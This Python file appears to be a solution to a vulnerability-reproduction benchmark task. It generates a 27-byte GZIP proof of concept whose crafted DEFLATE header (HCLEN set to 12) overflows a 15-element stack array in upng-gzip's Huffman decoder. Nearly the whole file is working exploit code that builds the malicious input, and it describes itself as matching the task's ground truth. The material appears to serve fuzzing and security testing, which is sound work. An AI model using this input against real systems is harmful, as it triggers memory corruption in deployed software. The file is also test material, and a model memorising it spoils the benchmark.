import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) for a stack buffer overflow in upng-gzip.

        The vulnerability exists in the Huffman decoding logic. A temporary stack array
        of size 15 is used to store code lengths for the code-length alphabet. However,
        the DEFLATE stream can specify up to 19 such code lengths via the HCLEN field
        in a dynamic block header (number of lengths = HCLEN + 4).

        To trigger the overflow, we craft a DEFLATE stream that requests to read 16
        code lengths. This is achieved by setting HCLEN to 12 (since 12 + 4 = 16).
        When the decoder attempts to write the 16th code length into the 15-element
        array (at index 15), it causes a stack buffer overflow.

        The PoC consists of a minimal GZIP file containing this malicious DEFLATE stream.
        - GZIP Header (10 bytes)
        - Malicious DEFLATE Stream (9 bytes)
        - GZIP Footer (8 bytes)
        Total length is 27 bytes, matching the ground truth.
        """

        class BitStream:
            def __init__(self):
                self.bits = []

            def write(self, value: int, num_bits: int):
                for i in range(num_bits):
                    self.bits.append((value >> i) & 1)

            def get_bytes(self) -> bytes:
                while len(self.bits) % 8 != 0:
                    self.bits.append(0)
                
                b = bytearray()
                for i in range(0, len(self.bits), 8):
                    byte_val = 0
                    for j in range(8):
                        if self.bits[i+j] == 1:
                            byte_val |= (1 << j)
                    b.append(byte_val)
                return bytes(b)

        bs = BitStream()

        # Part 1: DEFLATE Block Header (17 bits total)
        # Set BFINAL to 1 (final block) and BTYPE to 2 (dynamic Huffman codes)
        bs.write(1, 1)  # BFINAL
        bs.write(2, 2)  # BTYPE
        
        # Set table sizes. HLIT=0 (257 codes), HDIST=0 (1 code).
        bs.write(0, 5)  # HLIT
        bs.write(0, 5)  # HDIST
        
        # Set HCLEN to 12. This tells the decoder to read HCLEN + 4 = 16 code lengths.
        bs.write(12, 4) # HCLEN

        # Part 2: Code Lengths (16 lengths * 3 bits/length = 48 bits)
        # Provide 16 code lengths. The 16th write will overflow the 15-element buffer.
        # The actual values don't matter, so we use 1.
        for _ in range(16):
            bs.write(1, 3)

        # The total bitstream length is 17 + 48 = 65 bits.
        # This is padded to 72 bits (9 bytes).
        deflate_stream = bs.get_bytes()

        # Part 3: GZIP Container
        # A minimal 10-byte GZIP header.
        gzip_header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff'
        
        # A standard 8-byte GZIP footer (CRC32 and ISIZE).
        # Since the crash occurs before any data is output, the uncompressed
        # data is empty, so CRC32 and ISIZE are both 0.
        gzip_footer = b'\x00\x00\x00\x00\x00\x00\x00\x00'

        # Assemble the final 27-byte PoC.
        poc = gzip_header + deflate_stream + gzip_footer
        
        return poc